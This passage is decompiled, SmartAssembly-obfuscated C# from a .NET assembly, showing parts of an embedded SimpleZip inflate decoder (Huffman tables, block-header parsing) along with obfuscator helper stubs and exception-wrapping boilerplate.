            throw;
          }
label_40:
          switch (1)
          {
          }
        }
        catch (Exception ex)
        {
          int num10;
          object[] objects = new object[27]
          {
            (object) numArray1,
            (object) numArray2,
            (object) index1,
            (object) num2,
            (object) Ⴃ1,
            (object) length,
            (object) index3,
            (object) num3,
            (object) num4,
            (object) num5,
            (object) index4,
            (object) num6,
            (object) num7,
            (object) Ⴃ2,
            (object) index5,
            (object) index6,
            (object) index7,
            (object) num8,
            (object) num9,
            (object) numArray3,
            (object) index2,
            (object) objArray,
            (object) numArray4,
            (object) num1,
            (object) num10,
            (object) this,
            (object) Ⴀ
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }

      public int Ⴈ(SimpleZip.ႤႤ Ⴀ)
      {
        int num1;
        int index;
        int num2;
        int num3;
        int num4;
        int Ⴗ1;
        int Ⴗ2;
        int Ⴗ3;
        try
        {
          try
          {
            num1 = 15;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  num1 = (num2 = (int) this.Ⴓ.Ⴄ[index]) < 0 ? 12 : 3;
                  continue;
                case 1:
                case 14:
                  Ⴗ3 = Ⴀ.Ⴐ();
                  index = Ⴀ.Ⴍ(Ⴗ3);
                  num2 = (int) this.Ⴓ.Ⴄ[index];
                  num1 = 18;
                  continue;
                case 2:
                  goto label_11;
                case 3:
                  goto label_4;
                case 4:
                case 9:
                  num1 = (num2 & 15) > Ⴗ2 ? 2 : 17;
                  continue;
                case 5:
                  goto label_17;
                case 6:
                  goto label_15;
                case 7:
                  goto label_16;
                case 8:
                  num2 = (int) this.Ⴓ.Ⴄ[num4 | index >> 9];
                  num1 = 11;
                  continue;
                case 10:
                  num1 = (num2 & 15) > Ⴗ3 ? 5 : 6;
                  continue;
                case 11:
                  goto label_7;
                case 12:
                  num4 = -(num2 >> 4);
                  Ⴗ1 = num2 & 15;
                  num1 = (index = Ⴀ.Ⴍ(Ⴗ1)) < 0 ? 13 : 8;
                  continue;
                case 13:
                  Ⴗ2 = Ⴀ.Ⴐ();
                  index = Ⴀ.Ⴍ(Ⴗ2);
                  num2 = (int) this.Ⴓ.Ⴄ[num4 | index >> 9];
                  num1 = 9;
                  continue;
                case 17:
                  goto label_10;
                case 18:
                  num1 = num2 < 0 ? 5 : 10;
                  continue;
                default:
                  num1 = (index = Ⴀ.Ⴍ(9)) < 0 ? 14 : 0;
                  continue;
              }
            }
label_4:
            Ⴀ.Ⴅ(num2 & 15);
            num3 = num2 >> 4;
            goto label_19;
label_7:
            Ⴀ.Ⴅ(num2 & 15);
            num3 = num2 >> 4;
            goto label_19;
label_10:
            Ⴀ.Ⴅ(num2 & 15);
            num3 = num2 >> 4;
            goto label_19;
label_11:
            num3 = -1;
            goto label_19;
label_15:
            Ⴀ.Ⴅ(num2 & 15);
label_16:
            num3 = num2 >> 4;
            goto label_19;
label_17:
            num3 = -1;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) index;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) num4;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) Ⴗ1;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) Ⴗ2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o6 = (ValueType) Ⴗ3;
            SimpleZip.ႤႤ o8 = Ⴀ;
            StackFrameHelper.CreateException8(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) this, (object) o8);
            throw;
          }
label_19:
          switch (1)
          {
            default:
              return num3;
          }
        }
        catch (Exception ex)
        {
          int num5;
          object[] objects = new object[11]
          {
            (object) index,
            (object) num2,
            (object) num4,
            (object) Ⴗ1,
            (object) Ⴗ2,
            (object) Ⴗ3,
            (object) num3,
            (object) num1,
            (object) num5,
            (object) this,
            (object) Ⴀ
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }
    }

    internal sealed class ႤႣ
    {
      private static readonly int[] Ⴃ;
      private static readonly int[] Ⴗ;
      private SimpleZip.ႤႳ Ⴗ;
      private static readonly int[] Ⴅ;
      private Ⴈ.ႷႭ.ႰႭ Ⴓ;

      public ႤႣ()
      {
        try
        {
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException1(ex, (object) this);
          throw;
        }
      }

      public bool Ⴐ(SimpleZip.ႤႤ Ⴗ)
      {
label_0:
        int num1;
        int num2;
        int num3;
        bool flag;
        int num4;
        int num5;
        int num6;
        int num7;
        int num8;
        byte[] numArray1;
        int num9;
        int num10;
        int num11;
        byte[] numArray2;
        int num12;
        int num13;
        int num14;
        int num15;
        byte[] numArray3;
        int num16;
        int num17;
        int num18;
        int num19;
        byte num20;
        byte num21;
        byte num22;
        int num23;
        int num24;
        int num25;
        int num26;
        int num27;
        int num28;
        try
        {
          try
          {
            while (true)
            {
              num1 = 4;
              while (true)
              {
                switch (num1)
                {
                  case 0:
                    Ⴗ.Ⴅ(num25);
                    num26 += SimpleZip.ႤႣ.Ⴃ[this.Ⴓ.Ⴍ];
                    num1 = 20;
                    continue;
                  case 1:
                    goto label_30;
                  case 2:
                    this.Ⴗ = new SimpleZip.ႤႳ(this.Ⴓ.Ⴄ);
                    numArray3 = (byte[]) null;
                    this.Ⴓ.Ⴄ = numArray3;
                    num1 = 26;
                    continue;
                  case 3:
                    num1 = 22;
                    continue;
                  case 5:
                    num10 = Ⴗ.Ⴍ(4);
                    this.Ⴓ.Ⴓ = num10;
                    num1 = this.Ⴓ.Ⴓ >= 0 ? 42 : 21;
                    continue;
                  case 6:
                    goto label_41;
                  case 7:
                    byte[] ⴗ1 = this.Ⴓ.Ⴗ;
                    SimpleZip.ႤႣ ⴄⴃ1 = this;
                    num27 = (num2 = ⴄⴃ1.Ⴓ.Ⴜ) + 1;
                    ⴄⴃ1.Ⴓ.Ⴜ = num27;
                    int index1 = num2;
                    int ⴀ = (int) this.Ⴓ.Ⴀ;
                    ⴗ1[index1] = (byte) ⴀ;
                    num1 = 20;
                    continue;
                  case 8:
                    SimpleZip.ႤႣ ⴄⴃ2 = this;
                    num4 = ⴄⴃ2.Ⴓ.Ⴐ + 257;
                    ⴄⴃ2.Ⴓ.Ⴐ = num4;
                    num1 = 19;
                    continue;
                  case 9:
                    num1 = num19 < 17 ? 38 : 18;
                    continue;
                  case 10:
                    goto label_38;
                  case 11:
                    num7 = ++this.Ⴓ.Ⴈ;
                    num1 = 40;
                    continue;
                  case 12:
                    num1 = ((num19 = this.Ⴗ.Ⴈ(Ⴗ)) & -16) == 0 ? 34 : 37;
                    continue;
                  case 13:
                    num1 = this.Ⴓ.Ⴜ != this.Ⴓ.Ⴅ ? 12 : 10;
                    continue;
                  case 14:
                    num1 = num26 >= 0 ? 0 : 35;
                    continue;
                  case 15:
                    goto label_12;
                  case 16:
                    num3 = Ⴗ.Ⴍ(5);
                    this.Ⴓ.Ⴐ = num3;
                    num1 = this.Ⴓ.Ⴐ >= 0 ? 8 : 15;
                    continue;
                  case 17:
                    goto label_52;
                  case 18:
                    num22 = (byte) 0;
                    this.Ⴓ.Ⴀ = num22;
                    num1 = 38;
                    continue;
                  case 19:
                    Ⴗ.Ⴅ(5);
                    num5 = 1;
                    this.Ⴓ.Ⴃ = num5;
                    num1 = 39;
                    continue;
                  case 20:
                    num1 = num26-- > 0 ? 7 : 27;
                    continue;
                  case 21:
                    goto label_22;
                  case 22:
                    num1 = this.Ⴓ.Ⴜ < this.Ⴓ.Ⴓ ? 23 : 2;
                    continue;
                  case 23:
                    num14 = Ⴗ.Ⴍ(3);
                    num1 = num14 >= 0 ? 33 : 1;
                    continue;
                  case 24:
                    goto label_53;
                  case 25:
                    numArray1 = new byte[this.Ⴓ.Ⴅ];
                    this.Ⴓ.Ⴗ = numArray1;
                    num1 = 28;
                    continue;
                  case 26:
                    num16 = 0;
                    this.Ⴓ.Ⴜ = num16;
                    num17 = 4;
                    this.Ⴓ.Ⴃ = num17;
                    num1 = 12;
                    continue;
                  case 27:
                    num1 = this.Ⴓ.Ⴜ != this.Ⴓ.Ⴅ ? 24 : 17;
                    continue;
                  case 28:
                    num9 = 2;
                    this.Ⴓ.Ⴃ = num9;
                    num1 = 5;
                    continue;
                  case 29:
                    Ⴗ.Ⴅ(4);
                    goto case 45;
                  case 31:
                    num1 = 29;
                    continue;
                  case 32:
                    goto label_16;
                  case 33:
                    Ⴗ.Ⴅ(3);
                    this.Ⴓ.Ⴄ[SimpleZip.ႤႣ.Ⴅ[this.Ⴓ.Ⴜ]] = (byte) num14;
                    num1 = 44;
                    continue;
                  case 34:
                    byte[] ⴗ2 = this.Ⴓ.Ⴗ;
                    SimpleZip.ႤႣ ⴄⴃ3 = this;
                    num18 = (num2 = ⴄⴃ3.Ⴓ.Ⴜ) + 1;
                    ⴄⴃ3.Ⴓ.Ⴜ = num18;
                    int index2 = num2;
                    num21 = num20 = (byte) num19;
                    this.Ⴓ.Ⴀ = num21;
                    int num29 = (int) num20;
                    ⴗ2[index2] = (byte) num29;
                    num1 = 13;
                    continue;
                  case 35:
                    goto label_47;
                  case 36:
                    num12 = 0;
                    this.Ⴓ.Ⴜ = num12;
                    num13 = 3;
                    this.Ⴓ.Ⴃ = num13;
                    goto case 3;
                  case 37:
                    num1 = num19 >= 0 ? 9 : 6;
                    continue;
                  case 38:
                    num23 = num19 - 16;
                    this.Ⴓ.Ⴍ = num23;
                    num24 = 5;
                    this.Ⴓ.Ⴃ = num24;
                    num1 = 41;
                    continue;
                  case 39:
                    num6 = Ⴗ.Ⴍ(5);
                    this.Ⴓ.Ⴈ = num6;
                    num1 = this.Ⴓ.Ⴈ >= 0 ? 11 : 32;
                    continue;
                  case 40:
                    Ⴗ.Ⴅ(5);
                    num8 = this.Ⴓ.Ⴐ + this.Ⴓ.Ⴈ;
                    this.Ⴓ.Ⴅ = num8;
                    num1 = 25;
                    continue;
                  case 41:
                    num25 = SimpleZip.ႤႣ.Ⴗ[this.Ⴓ.Ⴍ];
                    num26 = Ⴗ.Ⴍ(num25);
                    num1 = 14;
                    continue;
                  case 42:
                    SimpleZip.ႤႣ ⴄⴃ4 = this;
                    num11 = ⴄⴃ4.Ⴓ.Ⴓ + 4;
                    ⴄⴃ4.Ⴓ.Ⴓ = num11;
                    goto case 31;
                  case 43:
                    goto label_0;
                  case 44:
                    num15 = ++this.Ⴓ.Ⴜ;
                    num1 = 22;
                    continue;
                  case 45:
                    numArray2 = new byte[19];
                    this.Ⴓ.Ⴄ = numArray2;
                    num1 = 36;
                    continue;
                  default:
                    num2 = this.Ⴓ.Ⴃ;
                    int num30;
                    switch (num2)
                    {
                      case 0:
                        num30 = 16;
                        break;
                      case 1:
                        num30 = 39;
                        break;
                      case 2:
                        num30 = 5;
                        break;
                      case 3:
                        num30 = 22;
                        break;
                      case 4:
                        num30 = 12;
                        break;
                      case 5:
                        num30 = 41;
                        break;
                      default:
                        num30 = 43;
                        break;
                    }
                    num1 = num30;
                    continue;
                }
              }
label_53:
              num28 = 4;
              this.Ⴓ.Ⴃ = num28;
            }
label_12:
            flag = false;
            goto label_55;
label_16:
            flag = false;
            goto label_55;
label_22:
            flag = false;
            goto label_55;
label_30:
            flag = false;
            goto label_55;
label_38:
            flag = true;
            goto label_55;
label_41:
            flag = false;
            goto label_55;
label_47:
            flag = false;
            goto label_55;
label_52:
            flag = true;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) num14;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) num19;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) num25;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) num26;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<byte> o6 = (ValueType) num20;
            SimpleZip.ႤႤ o8 = Ⴗ;
            StackFrameHelper.CreateException8(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) this, (object) o8);
            throw;
          }
label_55:
          switch (2)
          {
            default:
              return flag;
          }
        }
        catch (Exception ex)
        {
          int num31;
          object[] objects = new object[35]
          {
            (object) num14,
            (object) num19,
            (object) num25,
            (object) num26,
            (object) num2,
            (object) num20,
            (object) flag,
            (object) num3,
            (object) num4,
            (object) num5,
            (object) num6,
            (object) num7,
            (object) num8,
            (object) numArray1,
            (object) num9,
            (object) num10,
            (object) num11,
            (object) numArray2,
            (object) num12,
            (object) num13,
            (object) num15,
            (object) numArray3,
            (object) num16,
            (object) num17,
            (object) num18,
            (object) num21,
            (object) num22,
            (object) num23,
            (object) num24,
            (object) num27,
            (object) num28,
            (object) num1,
            (object) num31,
            (object) this,
            (object) Ⴗ
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }

      public SimpleZip.ႤႳ Ⴓ()
      {
        int num1;
        byte[] Ⴃ;
        SimpleZip.ႤႳ ⴄⴓ;
        try
        {
          try
          {
            num1 = 3;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  num1 = 5;
                  continue;
                case 1:
                case 4:
                case 5:
                  goto label_4;
                default:
                  Ⴃ = new byte[this.Ⴓ.Ⴐ];
                  AppPathFinder.Ⴍ((Array) this.Ⴓ.Ⴗ, 0, (Array) Ⴃ, 0, this.Ⴓ.Ⴐ, 341, 335);
                  goto case 0;
              }
            }
label_4:
            ⴄⴓ = new SimpleZip.ႤႳ(Ⴃ);
          }
          catch (Exception ex)
          {
            byte[] o1 = Ⴃ;
            StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
            throw;
          }
          switch (3)
          {
            default:
              return ⴄⴓ;
          }
        }
        catch (Exception ex)
        {
          byte[] o1 = Ⴃ;
          SimpleZip.ႤႳ o2 = ⴄⴓ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num1;
          int num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num2;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) this);
          throw;
        }
      }

      public SimpleZip.ႤႳ Ⴍ()
      {
        int num1;
        byte[] Ⴃ;
        SimpleZip.ႤႳ ⴄⴓ;
        try
        {
          try
          {
            num1 = 0;
            while (true)
            {
              switch (num1)
              {
                case 1:
                  goto label_3;
                default:
                  Ⴃ = new byte[this.Ⴓ.Ⴈ];
                  AppPathFinder.Ⴍ((Array) this.Ⴓ.Ⴗ, this.Ⴓ.Ⴐ, (Array) Ⴃ, 0, this.Ⴓ.Ⴈ, 780, 790);
                  num1 = 1;
                  continue;
              }
            }
label_3:
            ⴄⴓ = new SimpleZip.ႤႳ(Ⴃ);
          }
          catch (Exception ex)
          {
            byte[] o1 = Ⴃ;
            StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
            throw;
          }
          switch (1)
          {
            default:
              return ⴄⴓ;
          }
        }
        catch (Exception ex)
        {
          byte[] o1 = Ⴃ;
          SimpleZip.ႤႳ o2 = ⴄⴓ;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) num1;
          int num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num2;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) this);
          throw;
        }
      }

      static ႤႣ()
      {
        int num1;
        try
        {
          SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
          try
          {
            num1 = 1;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  goto label_5;
                case 5:
                  num1 = 0;
                  continue;
                default:
                  int[] numArray1 = new int[3];
                  // ISSUE: field reference
                  UsageReportSender.Ⴀ((Array) numArray1, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0024\u0024method0x6000032\u002D1), 166, 135);
                  SimpleZip.ႤႣ.Ⴃ = numArray1;
                  int[] numArray2 = new int[3];
                  // ISSUE: field reference
                  UsageReportSender.Ⴀ((Array) numArray2, __fieldref (\u003CPrivateImplementationDetails\u003E.\u0024\u0024method0x6000032\u002D2), 249, 216);
                  SimpleZip.ႤႣ.Ⴗ = numArray2;
                  goto case 5;
              }
            }
label_5:
            SimpleZip.ႤႣ.Ⴅ = new int[19]
            {
              16,
              17,
              18,
              0,
              8,
              7,
              9,
              6,
              10,
              5,
              11,
              4,
              12,
              3,
              13,
              2,
              14,
              1,
              15
            };
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException0(ex);
            throw;
          }
          switch (4)
          {
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          int num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) o2);
          throw;
        }
      }
    }

    internal sealed class ႤႷ
    {
      private SimpleZip.ႤႼ Ⴃ;
      private SimpleZip.ႤႨ Ⴅ;
      private ႷႤ.Ⴈ Ⴄ;

      public ႤႷ()
      {
        int num1 = 16;
        this.Ⴄ.Ⴓ = num1;
        long num2 = 0;
        this.Ⴄ.Ⴀ = num2;
        // ISSUE: explicit constructor call
        base.\u002Ector();
        try
        {
          try
          {
            this.Ⴃ = new SimpleZip.ႤႼ();
            this.Ⴅ = new SimpleZip.ႤႨ(this.Ⴃ);
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<long> o2 = (ValueType) num2;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) this);
          throw;
        }
      }

      [SpecialName]
      public long Ⴍ()
      {
        try
        {
          long ⴀ;
          try
          {
            ⴀ = this.Ⴄ.Ⴀ;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
          return ⴀ;
        }
        catch (Exception ex)
        {
          long num;
          // ISSUE: variable of a boxed type
          __Boxed<long> o1 = (ValueType) num;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }

      public void Ⴃ()
      {
        int num;
        try
        {
          try
          {
            SimpleZip.ႤႷ ⴄⴗ = this;
            num = ⴄⴗ.Ⴄ.Ⴓ | 12;
            ⴄⴗ.Ⴄ.Ⴓ = num;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }

      [SpecialName]
      public bool Ⴓ()
      {
        int num;
        try
        {
          bool flag;
          try
          {
            num = 5;
            while (true)
            {
              switch (num)
              {
                case 0:
                  goto label_6;
                case 1:
                case 2:
                  goto label_4;
                case 4:
                  goto label_3;
                default:
                  num = this.Ⴄ.Ⴓ != 30 ? 2 : 4;
                  continue;
              }
            }
label_3:
            flag = this.Ⴃ.Ⴐ();
            goto label_6;
label_4:
            flag = false;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
label_6:
          return flag;
        }
        catch (Exception ex)
        {
          bool flag;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o1 = (ValueType) flag;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) this);
          throw;
        }
      }

      [SpecialName]
      public bool Ⴅ()
      {
        try
        {
          bool flag;
          try
          {
            flag = this.Ⴅ.Ⴀ();
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
          return flag;
        }
        catch (Exception ex)
        {
          bool flag;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o1 = (ValueType) flag;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }

      public void Ⴅ(byte[] Ⴓ)
      {
        try
        {
          try
          {
            this.Ⴅ.Ⴈ(Ⴓ);
          }
          catch (Exception ex)
          {
            byte[] o2 = Ⴓ;
            StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
            throw;
          }
        }
        catch (Exception ex)
        {
          byte[] o2 = Ⴓ;
          StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
          throw;
        }
      }

      public int Ⴗ(byte[] Ⴗ)
      {
        int num1;
        int Ⴈ;
        int length;
        int num2;
        int num3;
        long num4;
        int num5;
        int num6;
        int num7;
        int num8;
        try
        {
          try
          {
            num1 = 14;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  SimpleZip.ႤႷ ⴄⴗ = this;
                  num4 = ⴄⴗ.Ⴄ.Ⴀ + (long) num3;
                  ⴄⴗ.Ⴄ.Ⴀ = num4;
                  num1 = 5;
                  continue;
                case 1:
                  this.Ⴃ.Ⴅ(2, 10);
                  num6 -= 10;
                  num1 = 18;
                  continue;
                case 2:
                  goto label_9;
                case 3:
                  num3 = this.Ⴃ.Ⴅ(Ⴗ, Ⴈ, length);
                  Ⴈ += num3;
                  num1 = 0;
                  continue;
                case 4:
                  num1 = this.Ⴄ.Ⴓ != 28 ? 3 : 10;
                  continue;
                case 5:
                  length -= num3;
                  num1 = length == 0 ? 8 : 6;
                  continue;
                case 6:
                  num1 = this.Ⴄ.Ⴓ == 30 ? 8 : 15;
                  continue;
                case 8:
                  goto label_18;
                case 9:
                case 17:
                  num1 = this.Ⴄ.Ⴓ != 20 ? 4 : 11;
                  continue;
                case 10:
                  this.Ⴃ.Ⴃ();
                  num8 = 30;
                  this.Ⴄ.Ⴓ = num8;
                  num1 = 3;
                  continue;
                case 11:
                  num6 = 8 + (-this.Ⴃ.Ⴓ() & 7);
                  num1 = 18;
                  continue;
                case 12:
                  num1 = 3;
                  continue;
                case 13:
                case 16:
                  num7 = 16;
                  this.Ⴄ.Ⴓ = num7;
                  goto case 12;
                case 15:
                  num1 = this.Ⴅ.Ⴄ((this.Ⴄ.Ⴓ & 4) != 0, (this.Ⴄ.Ⴓ & 8) != 0) ? 3 : 19;
                  continue;
                case 18:
                  num1 = num6 > 0 ? 1 : 13;
                  continue;
                case 19:
                  num1 = this.Ⴄ.Ⴓ != 16 ? 17 : 2;
                  continue;
                default:
                  Ⴈ = 0;
                  length = Ⴗ.Length;
                  num2 = length;
                  num1 = 3;
                  continue;
              }
            }
label_9:
            num5 = num2 - length;
            goto label_20;
label_18:
            num5 = num2 - length;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) Ⴈ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) length;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) num2;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) num3;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) num6;
            byte[] o7 = Ⴗ;
            StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) this, (object) o7);
            throw;
          }
label_20:
          switch (4)
          {
            default:
              return num5;
          }
        }
        catch (Exception ex)
        {
          int num9;
          object[] objects = new object[13]
          {
            (object) Ⴈ,
            (object) length,
            (object) num2,
            (object) num3,
            (object) num6,
            (object) num5,
            (object) num4,
            (object) num7,
            (object) num8,
            (object) num1,
            (object) num9,
            (object) this,
            (object) Ⴗ
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }

      static ႤႷ()
      {
        try
        {
          SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
      }

      internal static Color Ⴈ([In] int obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        try
        {
label_3:
          int num2;
          switch (obj2 ^ obj1)
          {
            case 118:
              num2 = 0;
              break;
            default:
              num2 = 1;
              break;
          }
          num1 = num2;
          while (true)
          {
            switch (num1)
            {
              case 0:
                goto label_8;
              case 1:
              case 3:
                num1 = 7;
                continue;
              case 2:
              case 7:
                goto label_3;
              case 5:
                num1 = 7;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႤႷ.Ⴈ);
                num1 = 7;
                continue;
            }
          }
label_8:
          return Color.FromArgb(obj0);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) obj2;
          StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
          throw;
        }
      }

      internal static string Ⴄ([In] int obj0, [In] int obj1)
      {
        int num1;
        try
        {
label_3:
          int num2;
          switch (obj1 ^ obj0)
          {
            case 107:
              num2 = 1;
              break;
            default:
              num2 = 6;
              break;
          }
          num1 = num2;
          while (true)
          {
            switch (num1)
            {
              case 0:
              case 2:
                goto label_3;
              case 1:
              case 7:
                goto label_8;
              case 5:
                num1 = 2;
                continue;
              case 6:
                num1 = 2;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႤႷ.Ⴄ);
                num1 = 2;
                continue;
            }
          }
label_8:
          return Environment.SystemDirectory;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) obj1;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
          throw;
        }
      }

      internal static Version Ⴜ([In] int obj0, [In] int obj1)
      {
        int num1;
        try
        {
label_3:
          int num2;
          switch (obj1 ^ obj0)
          {
            case 74:
              num2 = 7;
              break;
            default:
              num2 = 4;
              break;
          }
          num1 = num2;
          while (true)
          {
            switch (num1)
            {
              case 0:
              case 1:
              case 5:
                goto label_3;
              case 2:
                num1 = 0;
                continue;
              case 4:
                num1 = 0;
                continue;
              case 7:
                goto label_8;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႤႷ.Ⴜ);
                num1 = 0;
                continue;
            }
          }
label_8:
          return Environment.Version;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) obj1;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
          throw;
        }
      }

      internal static void ႷႠ([In] AppDomain obj0, [In] string obj1, [In] object obj2, [In] int obj3, [In] int obj4)
      {
label_0:
        try
        {
          switch ((obj4 ^ obj3) - 84)
          {
            case 0:
              obj0.SetData(obj1, obj2);
              break;
            default:
              goto label_0;
          }
        }
        catch (Exception ex)
        {
          AppDomain o1 = obj0;
          string o2 = obj1;
          object o3 = obj2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) obj3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) obj4;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, o3, (object) o4, (object) o5);
          throw;
        }
      }

      [StructLayout(LayoutKind.Auto)]
      internal struct Ⴀ
      {
        internal short[] Ⴄ;
      }

      [StructLayout(LayoutKind.Auto)]
      internal struct Ⴐ
      {
        internal int Ⴗ;
        internal short[] Ⴐ;
        internal short[] Ⴈ;
        internal int Ⴍ;
        internal int Ⴅ;
        internal bool Ⴄ;
        internal int Ⴀ;
        internal int Ⴃ;
        internal int Ⴓ;
        internal byte[] Ⴜ;
        internal byte[] ႰႷ;
        internal int ႰႰ;
        internal int ႰႨ;
        internal int ႰႭ;
      }
    }

    internal sealed class ႤႠ
    {
      private static readonly int[] Ⴗ;
      private static readonly byte[] Ⴄ;
      private SimpleZip.ႤႼ Ⴈ;
      private SimpleZip.ႤႠ.ႤႥ Ⴐ;
      private SimpleZip.ႤႠ.ႤႥ Ⴈ;
      private SimpleZip.ႤႠ.ႤႥ Ⴀ;
      private static readonly short[] Ⴐ;
      private static readonly byte[] Ⴍ;
      private static readonly short[] Ⴃ;
      private static readonly byte[] Ⴐ;
      private SecurityExceptionEventArgs.Ⴈ Ⴓ;

      public static short Ⴓ(int Ⴃ)
      {
        try
        {
          short num;
          try
          {
            num = (short) ((int) SimpleZip.ႤႠ.Ⴄ[Ⴃ & 15] << 12 | (int) SimpleZip.ႤႠ.Ⴄ[Ⴃ >> 4 & 15] << 8 | (int) SimpleZip.ႤႠ.Ⴄ[Ⴃ >> 8 & 15] << 4 | (int) SimpleZip.ႤႠ.Ⴄ[Ⴃ >> 12]);
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) Ⴃ;
            StackFrameHelper.CreateException1(ex, (object) o1);
            throw;
          }
          return num;
        }
        catch (Exception ex)
        {
          short num;
          // ISSUE: variable of a boxed type
          __Boxed<short> o1 = (ValueType) num;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) Ⴃ;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) o2);
          throw;
        }
      }

      static ႤႠ()
      {
        int num1;
        int index;
        try
